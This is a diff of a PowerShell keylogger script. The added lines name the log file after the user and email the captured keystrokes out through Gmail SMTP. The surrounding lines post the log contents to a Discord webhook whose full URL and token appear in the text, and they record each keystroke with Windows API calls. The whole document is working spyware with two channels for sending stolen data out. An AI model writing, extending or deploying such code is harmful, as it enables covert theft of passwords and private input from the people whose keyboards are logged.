@@ -7,8 +7,17 @@ $webhookUri = 'https://discord.com/api/webhooks/941122393366204447/bqjN-dHZTcO1e
   'content' = get-content $env:temp/keylogger.log
 }
 
+
 # keylogger
-function KeyLogger($logFile="$env:temp/keylogger.log") {
+function KeyLogger($logFile="$env:temp/$env:UserName.log") {
+
+  # email process
+  $logs = Get-Content "$logFile"
+  $subject = "$env:UserName logs"
+  $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
+  $smtp.EnableSSL = $true
+  $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
+  $smtp.Send($email, $email, $subject, $logs);
 
   # generate log file
   $generateLog = New-Item -Path $logFile -ItemType File -Force
@@ -54,7 +63,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
             # add logged key to file
             [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
-   
           }
         }
       }
